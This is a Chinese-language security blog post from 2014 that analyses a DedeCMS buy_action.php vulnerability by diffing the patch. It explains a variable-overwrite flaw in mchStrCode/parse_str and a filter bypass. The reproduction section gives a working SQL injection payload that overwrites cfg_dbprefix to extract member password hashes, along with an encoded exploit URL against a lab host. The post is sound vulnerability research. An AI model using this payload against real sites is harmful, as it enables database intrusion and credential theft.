---
layout: post
title: "Dedecms buy_action.php SQL注入漏洞分析"
date: 2014-03-04 21:26:50 +0800
comments: true
categories: 技术
---

#0x01 补丁对比
通过对比源码和2月25日补丁发现被改动的文件有三个，buy_action.php、uploadsafe.inc.php和sys_info.htm。

sys_info.htm只是添加了一个重置cfg_cookie_encode的代码，而且是静态文件，可以忽略掉。uploadsafe.inc.php是另外一个注入漏洞的修补,所以只剩下buy_action.php文件，下面我们来看下发生变化的地方：

<!--more-->

变化前

```php
/**
 *  加密函数
 *
 * @access    public
 * @param     string  $string  字符串
 * @param     string  $action  操作
 * @return    string
 */
function mchStrCode($string,$action='ENCODE')
{
    $key    = substr(md5($_SERVER["HTTP_USER_AGENT"].$GLOBALS['cfg_cookie_encode']),8,18);
    $string    = $action == 'ENCODE' ? $string : base64_decode($string);
    $len    = strlen($key);
    $code    = '';
    for($i=0; $i<strlen($string); $i++)
    {
        $k        = $i % $len;
        $code  .= $string[$i] ^ $key[$k];
    }
    $code = $action == 'DECODE' ? $code : base64_encode($code);
    return $code;
}
```

变化后

```php
/**
 *  加密函数
 *
 * @access    public
 * @param     string  $string  字符串
 * @param     string  $operation  操作
 * @return    string
 */
function mchStrCode($string, $operation = 'ENCODE') 
{
    $key_length = 4;
    $expiry = 0;
    $key = md5($GLOBALS['cfg_cookie_encode']);
    $fixedkey = md5($key);
    $egiskeys = md5(substr($fixedkey, 16, 16));
    $runtokey = $key_length ? ($operation == 'ENCODE' ? substr(md5(microtime(true)), -$key_length) : substr($string, 0, $key_length)) : '';
    $keys = md5(substr($runtokey, 0, 16) . substr($fixedkey, 0, 16) . substr($runtokey, 16) . substr($fixedkey, 16));
    $string = $operation == 'ENCODE' ? sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$egiskeys), 0, 16) . $string : base64_decode(substr($string, $key_length));

    $i = 0; $result = '';
    $string_length = strlen($string);
    for ($i = 0; $i < $string_length; $i++){
        $result .= chr(ord($string{$i}) ^ ord($keys{$i % 32}));
    }
    if($operation == 'ENCODE') {
        return $runtokey . str_replace('=', '', base64_encode($result));
    } else {
        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$egiskeys), 0, 16)) {
            return substr($result, 26);
        } else {
            return '';
        }
    }
}
```

由此我们可以断定，这个漏洞应该是由于mchStrCode这个编码方法造成的。在读这个函数时发现，如果在我们知道cfg_cookie_encode的情况下，被编码字符串是可以被逆推出来的。

因此，我们可以初步断定，在某个使用这个编码函数进行解码的地方，解码后没有进行任何的校验和过滤，便将内容传入到SQL语句中，并且用户可以控制进入编码函数进行解码的字符串，从而导致SQL注入的产生。

#0x02 原理分析

这个问题出现在buy_action.php文件的开始部分，相关代码如下：

```php
//省略部分代码
if(isset($pd_encode) && isset($pd_verify) && md5("payment".$pd_encode.$cfg_cookie_encode) == $pd_verify)
{
    parse_str(mchStrCode($pd_encode,'DECODE'),$mch_Post);
    foreach($mch_Post as $k => $v) $$k = $v;*］
    $row  = $dsql->GetOne("SELECT * FROM #@__member_operation WHERE mid='$mid' And sta=0 AND product='$product'");
    if(!isset($row['buyid']))
    {
        ShowMsg("请不要重复提交表单!", 'javascript:;');
        exit();
    }
    if(!isset($paytype))
    {
        ShowMsg("请选择支付方式!", 'javascript:;');
        exit(); 
    }
    $buyid = $row['buyid'];

}//省略部分代码
```

我们重点来看if语句开始时的三行代码，mchStrCode是我们在上一小节通过对比补丁发现变化的函数。也就是说这个函数可以编码或者解码，用户提交的数据，而且$pd_encode也是我们可以控制的变量。

parse_str方法将解码后$pd_encode中的变量放到$mch_Post数组中，之后的foreach语句存在明显的变量覆盖，将$mch_Post中的key定义为变量，同时将key所对应的value赋予该变量。然后，再向下就是执行SQL查询了。

在这个过程中存在一个明显的疏忽是，没有对定义的key进行检查，导致攻击者可以通过mschStrCode编码攻击代码，绕过GPC和其他过滤机制，使攻击代码直达目标。

其实如果从漏洞成因的角度来看，这属于全局变量覆盖漏洞，而非SQL注入漏洞。

#0x03 利用思路
漏洞原理比较简单，但是利用起来还是有很大的难度的，从我实现的过程来看，具体的绊脚石有两个：

1. 如果开启GPC，parse_str依然会对变量值中的特殊字符进行转义，仍然无法绕过。
2. mchStrCode这个函数的编码过程中需要知道网站预设的cfg_cookie_encode，而这个内容在用户界面只可以获取它的MD5值。

第一个问题解决很简单，虽然$mid和$product被单引号封闭，但是考虑到我们可以利用这个漏洞进行全局变量覆盖，我们可以直接覆盖全局变量cfg_dbprefix，将SQL注入语句插入到from后。也就是说我们可以通过覆盖表前缀变量，将SQL注入语句放置在from关键字后面。

第二个问题就有很大的难度，虽然cfg_cookie_encode的生成有一定的规律性，我们可以使用MD5碰撞的方法获得，但是时间成本太高，在最坏的情况下要跑超过20天的时间。

之后在想这个漏洞时，我想到那肯定是在什么地方可以使用mchStrCode加密可控参数，并且能够返回到页面中。

通过搜索整个源码文件，发现在buy_action.php文件的一个分支中使用了这个函数进行编码，并且只有这个地方进行了编码，相关代码如下：

```php
//省略部分代码
if(!isset($paytype))
{    
    $inquery = "INSERT INTO #@__member_operation(`buyid` , `pname` , `product` , `money` , `mtime` , `pid` , `mid` , `sta` ,`oldinfo`)
   VALUES ('$buyid', '$pname', '$product' , '$price' , '$mtime' , '$pid' , '$mid' , '0' , '$ptype');
    ";
    $isok = $dsql->ExecuteNoneQuery($inquery);
    if(!$isok)
    {
        echo "数据库出错，请重新尝试！".$dsql->GetError();
        exit();
    }
    
    if($price=='')
    {
        echo "无法识别你的订单！";
        exit();
    }
    
    //获取支付接口列表
    $payment_list = array();
    $dsql->SetQuery("SELECT * FROM #@__payment WHERE enabled='1' ORDER BY rank ASC");
    $dsql->Execute();
    $i = 0 ;
    while($row = $dsql->GetArray())
    {
        $payment_list[] = $row;
        $i++;
    }
    unset($row);

    $pr_encode = '';
    foreach($_REQUEST as $key => $val)
    {
        $pr_encode .= $pr_encode ? "&$key=$val" : "$key=$val";
    }
    $pr_encode = str_replace('=', '', mchStrCode($pr_encode));
    
    $pr_verify = md5("payment".$pr_encode.$cfg_cookie_encode);
    
    $tpl = new DedeTemplate();
    $tpl->LoadTemplate(DEDEMEMBER.'/templets/buy_action_payment.htm');
    $tpl->Display();
    
}//省略部分代码
```

通过这部分代码，我想到的利用方法是提交带有【cfg_dbprefix=SQL注入】的提交请求，进入这个分支，让它帮助我来编码【cfg_dbprefix=SQL注入】，从而获取相应的pr_encode和pr_verify。
但是，这样利用的话就会引出第三个问题，common.inc.php文件中对于用户提交的内容进行了过滤，凡是以cfg_、GLOBALS、_GET、_POST、_COOKIE等内容开头的提交都会被拦截。

这个问题的解决就利用到了$_REQUEST内容与parse_str函数内容的差异特性。试想，我们向网站传递“a=1&b=2%26c=3”这样的提交时，$_REQUEST的内容是【a=1，b=2%26c=3】.而通过上面代码的遍历进入parse_str函数的内容则是【a=1&b=2&c=3】，解析后的内容就变成了【a=1，b=2，c=3】。由此，我们可以通过这一特性来绕过common.inc.php文件对于参数内容传递的验证。

#0x04 漏洞重现
访问buy_action.php文件，使用如下参数：

> product=card&pid=1&a=1%26cfg_dbprefix=dede_member_operation WHERE 1=@`'` /*!12345union*/ select 1,2,3,4,5,6,7,8,9,10 FROM (SELECT COUNT(*),CONCAT( (SELECT pwd FROM dede_member LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a %23

其中product和pid参数是为了让我们进入mchStrCode对传入数据进行编码的分支，a是为了配合上面提到的差异特性而随意添加的参数。从cfg_dbprefix开始，便是真正的SQL注入攻击代码。
访问该URL后，在页面源码中找到pd_encode和pd_verify字段的值，由于用户Cookie和User-Agent不同，所获取的值也不同，我这里获取的值非别为

```
pd_encode:FkBdXBdXFw4AWEtVFkVQVwUEQFMPCURXBVQ8XVtBQlBfWkAIAldWXT1ZBl4BXEtuX0VcQVlBD11cGDV8JmEmGQgMcFVlFFgVSRgTCVAHVwYWV1BeXh8WE0tQCldRTEIFTwFPChUFHAAVBRQCSgoeAU4FUxMla3Z8EB1qdnRwJWYSey1hLWdLExAdc3p3cHlhThIaayd4JnA3GUlGVBV/YXd4RlZXXAdrDlYOW1xDEHlwfnFhRgIeCUsYJX8sdmsZYnR3dxAFTxgAEUtMQ3UxdnQReXt/fGp4J2Z7dyxrMHArfHRwHnZxcmp0JWZ3aj1nJmcwGX5jf2BpE3psRkobWUIXRWMraWp0Y2ZwdwUBUgZQDVRRUlJSAF8IBAQBAQhWVAMKDgBSUgYBXw0AARN9VlxQM0FXSitwXgFFfVxVVWBKVkp8Im1tWwl5BwZeD1wGCANaUQAGAgJUCFYHVRUnXF1UfFpeWlZhD19XBVMHWgBbCA0GAAwfd11RA35dXwtaN1oOXGZuU150Vw0IA1ELW1cDAQBaWg0CAwUBVg；
```

```
pd_verify：1c7ba5d2861959347d0c427684a6ad30。
```

以这两个字段作为参数访问buy_action.php，URL为：

```
http://192.168.188.142//dedecms5.7_sp1_utf8/member/buy_action.php?pd_encode=FkBdXBdXFw4AWEtVFkVQVwUEQFMPCURXBVQ8XVtBQlBfWkAIAldWXT1ZBl4BXEtuX0VcQVlBD11cGDV8JmEmGQgMcFVlFFgVSRgTCVAHVwYWV1BeXh8WE0tQCldRTEIFTwFPChUFHAAVBRQCSgoeAU4FUxMla3Z8EB1qdnRwJWYSey1hLWdLExAdc3p3cHlhThIaayd4JnA3GUlGVBV/YXd4RlZXXAdrDlYOW1xDEHlwfnFhRgIeCUsYJX8sdmsZYnR3dxAFTxgAEUtMQ3UxdnQReXt/fGp4J2Z7dyxrMHArfHRwHnZxcmp0JWZ3aj1nJmcwGX5jf2BpE3psRkobWUIXRWMraWp0Y2ZwdwUBUgZQDVRRUlJSAF8IBAQBAQhWVAMKDgBSUgYBXw0AARN9VlxQM0FXSitwXgFFfVxVVWBKVkp8Im1tWwl5BwZeD1wGCANaUQAGAgJUCFYHVRUnXF1UfFpeWlZhD19XBVMHWgBbCA0GAAwfd11RA35dXwtaN1oOXGZuU150Vw0IA1ELW1cDAQBaWg0CAwUBVg&pd_verify=1c7ba5d2861959347d0c427684a6ad30
```

效果如下图所示：

![1](/images/content/2014-03-04-01.jpg)
